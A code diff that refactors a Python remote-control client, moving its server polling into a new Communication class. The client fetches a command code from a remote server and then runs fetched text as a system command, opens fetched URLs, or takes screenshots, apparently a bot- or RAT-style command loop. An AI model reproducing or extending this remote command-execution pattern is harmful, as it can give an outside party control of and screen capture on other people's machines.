@@ -13,6 +13,7 @@ import method as mtd
 import constants as cfg
 from commands import Commands
 from bin.screenshot import Screenshot
+from bin.communication import Communication
 
 # defining used python version.
 if cfg.PY_VERSION == 3:
@@ -20,6 +21,7 @@ if cfg.PY_VERSION == 3:
 elif cfg.PY_VERSION == 2:
     from urllib import urlopen
 
+communication = Communication()
 
 # Global functions
 def filecheck():
@@ -78,15 +80,13 @@ def parse_cmd(inp, key):
 
     if inp == '1':
         print('input 1')
-        message = urlopen('%s%s%s' % (cfg.P_BASE, cfg.P_COMMAND, key))
-        message = message.read().strip()
+        message = communication.getdata(cfg.P_BASE, cfg.P_COMMAND, key)
         commands.system_cmd(message)
     elif inp == '2':
-        url_to_open = urlopen('%s%s%s' % (cfg.P_BASE, cfg.P_COMMAND, key))
-        url_to_open = url_to_open.read().strip()
+        url_to_open = communication.getdata(cfg.P_BASE, cfg.P_COMMAND, key)
         commands.open_webbrowser(url_to_open)
     elif inp == '3':
-        url_to_open = urlopen('%s%s%s' % (cfg.P_BASE, cfg.P_COMMAND, key))
+        url_to_open = communication.getdata(cfg.P_BASE, cfg.P_COMMAND, key)
 
         screenshot = Screenshot()
         screenshot.snap()
@@ -106,11 +106,10 @@ def get_cmd():
     print(logging)  # To see the result in the terminal.
     mtd.error_logging(logging)  # Writing to log file.
 
-    content = urlopen('%s%s%s' % (cfg.P_BASE, cfg.P_GET, key))
-    imported_content = content.read().strip()
+    content = communication.getdata(cfg.P_BASE, cfg.P_GET, key)
 
-    if key == imported_content:
-        content = urlopen('%s%s%s' % (cfg.P_BASE, cfg.P_MESSAGE, key)).read().strip()
+    if key == content:
+        content = communication.getdata(cfg.P_BASE, cfg.P_MESSAGE, key)
         print('Key is in imported_content', content)
         parse_cmd(content, key)
 
